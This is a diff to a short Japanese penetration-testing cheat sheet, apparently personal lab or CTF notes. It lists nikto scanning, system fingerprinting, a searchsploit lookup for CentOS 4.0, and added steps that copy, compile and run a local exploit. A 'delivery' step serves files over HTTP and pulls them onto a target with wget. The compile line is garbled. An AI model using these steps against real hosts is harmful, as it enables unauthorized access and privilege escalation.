@@ -10,7 +10,7 @@ Webサーバ
 
     nikto -h [HOST]
 
-サーバ状態確認
+状態確認
 
     uname -a
     cat /etc/redhat-release
@@ -19,10 +19,13 @@ Webサーバ
 exploitdb https://github.com/offensive-security/exploitdb
 
     searchsploit CentOS 4.0
+    cp /opt/exploitdb/exploits/linux_x86/local/XXX.c XXX.c
+    gcc gcc 9542.c -o test
+    ./test
 
 ## Delivery
 
-転送
+http転送
 
     python -m SimpleHTTPServer 9998
     wget http://address:9998/file
